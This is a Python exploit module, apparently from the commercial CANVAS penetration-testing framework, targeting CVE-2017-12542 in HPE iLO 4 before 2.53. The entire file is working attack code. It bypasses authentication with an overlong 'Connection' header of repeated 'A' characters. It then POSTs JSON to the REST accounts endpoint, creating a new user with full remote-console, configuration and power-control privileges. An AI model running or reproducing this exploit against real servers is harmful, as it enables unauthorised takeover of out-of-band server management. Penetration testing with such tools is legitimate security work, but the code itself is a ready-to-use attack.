#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2018
#http://www.immunityinc.com/CANVAS/ for more information

#Python_Imports
import sys

#Path_Appends
if "." not in sys.path:
    sys.path.append(".")

#CANVAS_Imports

import canvasengine
import libs.spkproxy as spkproxy
from exploitutils import *
from tcpexploit import tcpexploit

NAME                            = "HPE iLO 4 - AddNewAdmin"
DESCRIPTION                     = "This exploit manages to bypass HPE iLO 4 Authentication by creating a new admin user"
VERSION                         = "1.0"

DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Hewlett Packard Enterprise"
DOCUMENTATION["References"]     = "https://tools.cisco.com/security/center/viewAlert.x?alertId=54930"
DOCUMENTATION["CVE Name"]       = "CVE-2017-12542"
DOCUMENTATION["CVE Url"]        = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12542"
DOCUMENTATION["Changelog"]      = ""
DOCUMENTATION["Notes"]          = """

Vulnerable versions: HPE iLO 4 < 2.53
"""

PROPERTY                        = {}
PROPERTY["TYPE"]                = "Web Exploits"
PROPERTY["SITE"]                =  "Remote"
PROPERTY["ARCH"]                = [["Linux"]]
PROPERTY["VERSION"]             = []

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        #CLASS ATTRIBUTES
        self.name       = NAME
        self.debug      = False
        self.ssl        = True
        self.username   = None
        self.password   = None
        self.hostname   = None
        self.url        = "https://%s"
        self.UA         = None

    def getArgs(self):
        #CHECK EFFICIENCY OF SSL ARG SETTING
        self.getarg("ssl")
        if "True" or "true" not in self.ssl:
            self.ssl = False
        #GET HOSTNAME
        self.hostname = self.getarg("hostname")
        #SET URL
        self.url = self.url % self.hostname
        #GET USERNAME
        self.getarg("username")
        #GET PASSWORD
        self.getarg("password")
        #SET UA
        self.UA = self.setupUA()
        return

    def setupUA(self):
        UA = spkproxy.UserAgent(self.url, auth = None, hostname = self.hostname, exploit = self)
        logging.info("Actual User-Agent info: %s" % str(UA))
        return UA

    def testEndpoint(self):
        try:
            self.UA.addHeader("Connection", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
            (endpData, endpCode) = self.UA.GET("/rest/v1/AccountService/Accounts", return_response_code=True)
            logging.info("Endpoint's response (data): %s, %s" % (endpData, self.url))
            logging.info("Endpoint's response (code): %s, %s" % (endpCode, self.url))
        except Exception as e:
            logging.error("Error in testEndpoint(), request did not work as expected: %s" % (str(e)))
            return False
        return True, endpData

    def createAccount(self):
        body2 = '{"UserName": "' + self.username + '", "Password": "' + self.password + '", "Oem": {"Hp": {"Privileges": {"RemoteConsolePriv": true, "iLOConfigPriv": true, "VirtualMediaPriv": true, "UserConfigPriv": true, "VirtualPowerAndResetPriv": true, "LoginPriv": true}, "LoginName": "' + self.username + '"}}}'

        try:
            self.UA.addHeader("Content-Type", "application/json")
            (createAccData, createAccCode) = self.UA.POST("/rest/v1/AccountService/Accounts", body2, return_response_code=True)
            logging.info("POSTDATA: %s" % str(createAccData))
        except Exception as e:
            logging.error("Error in createAccount(), request did not work as expected (Connection): %s" % (str(e)))
            return False

        if createAccCode not in [400, 401, 415, 500, 501]:
            logging.info("New account %s/%s successfully created! (username/password)" % (self.username, self.password))
            return True
        elif "No server there" in createAccData:
            logging.error("Error in createAccount(), the requested account could not be created (Bad crafted URL)")
            return False

    def run(self):
        self.getArgs()

        if self.testEndpoint():
            if self.createAccount():
                self.setSucceeded()
                return True

        return False

if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
